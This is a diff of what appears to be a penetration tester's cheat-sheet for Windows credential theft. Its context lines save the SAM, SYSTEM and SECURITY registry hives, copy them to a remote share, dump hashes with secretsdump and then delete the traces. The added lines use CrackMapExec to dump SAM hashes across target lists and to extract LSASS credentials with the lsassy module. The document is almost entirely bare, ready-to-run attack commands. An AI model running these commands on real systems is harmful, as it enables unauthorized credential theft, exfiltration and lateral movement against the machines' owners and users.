@@ -23,7 +23,6 @@ copy systemx \\192.168.162.46\share\
 copy securityx \\192.168.162.46\share\  
 secretsdump -sam samx -system systemx LOCAL  
 
-
 ================================== 
 reg save hklm\sam C:\Windows\Temp\samx
 reg save hklm\system C:\Windows\Temp\systemx
@@ -64,6 +63,13 @@ bye
 ================================== 
 Cleanup
 del samx systemx securityx
+
+================================== 
+Crackmapexec
+
+cme smb ./targetip.txt -u bob -p 'paxx' --local-auth --sam
+cme smb 192.168.200.5 -u bob -p 'paxx' -d mydom -M lsassy
+
 
 ================================== 
 secretsdump -sam samx -system systemx LOCAL
